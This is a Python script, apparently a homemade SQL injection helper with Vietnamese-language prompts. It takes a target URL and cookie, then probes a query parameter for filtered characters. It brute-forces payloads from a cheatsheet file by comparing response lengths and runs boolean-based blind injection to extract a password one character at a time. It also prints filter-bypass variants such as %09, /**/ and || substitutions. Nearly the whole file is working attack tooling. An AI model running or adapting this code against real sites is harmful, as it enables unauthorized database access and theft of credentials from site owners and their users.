import requests
import string


char = string.printable
session = requests.Session()

url = input("url hia :  ")
print("url : "  , url)
cookie = input("cookie neu co : ")
header = {
    'Cookie' : cookie
}
print(cookie)

def Get_Easy_Bf(p): 
    f = open("cheatsheet.txt" , "r")   
    get = session.get(url = url , headers=header)
    len_r = len(get.text)
    print("length goc : " , len_r)
    for i in f:
        len_i = len(i)
        params = {
            p : i
        }
        get = session.get(url = url , headers=header , params=params)
        if len(get.text) - len_i != len_r:
            print(len(get.text) - len_i , i)
    f.close()

       
def Get_Filter(p , list_filter):
    sp  = input("special character :")  # ex: No Hack ...
    for i in char:
       get = session.get(url = url , headers=header , params= { p : i})
       if (sp in get.text) and (len(get.text) - 1 < 100):
        print(i)
        list_filter.append(i)
    print(list_filter)


def Get_Boolean(p):
    while(True):
        print("1.test length")
        print("2.brute force")
        choose = int(input("your choice : "))
        if choose == 1:
            f2 = open("length.txt" , "r")
            list = []
            for ch in f2:
                print(ch)
                list.append(ch)
            user_ch = int(input("your choice : "))
            for i in range (0,25):
                pw  = list[user_ch].replace("{pw}",p).replace("{i}",str(i))
                get = session.get(url = url , headers=header , params={p : pw[2:]} )
                print(len(get.text) , pw)
            f2.close()
        elif choose == 2:
            f1 = open("boolean.txt" , "r")
            list=[]        
            for ch in f1:                
                print(ch)
                list.append(ch)           
            user_ch = int(input("your choice : "))
            sp = input("special: ")
            len_pw = int(input("length :"))
            password = ""
            for i in range(1,len_pw):
                for j in char:
                    pass_1 = password + j
                    pw  = list[user_ch].replace("{pw}",p).replace("{i}",str(i)).replace("{j}" , pass_1).replace("\n","")
                    get = session.get(url = url , headers=header , params={p : pw[2:]})            
                    if (sp in get.text):
                        print(len(get.text) , pw[2:] ,get.url)                      
                        password = password + j
                        print(password)
                        break
            f1.close()


def Filter(list_filter):
    print(list_filter)
    while(True):
        list_payload = []
        payload = input("Your payload : ")
        for i in list_filter:
            if i in payload:
                list_payload.append(i)
        for i in list_payload:
            if i == " ":
                #/**/, %0a, %09, %0d, (), +
                print(payload.replace(i , "%09"))
                print(payload.replace(i , "%0a"))
                print(payload.replace(i , "%0d"))
                print(payload.replace(i , "()"))
                print(payload.replace(i , "+"))
                print(payload.replace(i , "/**/"))
                break
            if i == "or":
                print(payload.replace(i , "||"))
                break
            if i not in list_payload:
                print("payload : " , payload)
                break
        break


list_filter = [] 
while(True):
    print("1.GET")
    print("2.POST")
    choose = int(input("choose : "))
    if choose == 1:
        p = input("params : ")
        print("1.Check filter")
        print("2.Easy payload brute force")
        print("3.Boolean sql")
        print("4.Your payload + filter bypass ")
        choose_get = int(input("choose : "))
        if choose_get == 1 :
            Get_Filter(p , list_filter)
        elif choose_get == 2:
            Get_Easy_Bf(p)
        elif choose_get == 3:
            Get_Boolean(p)
        elif choose_get == 4:
            Filter(list_filter)


        

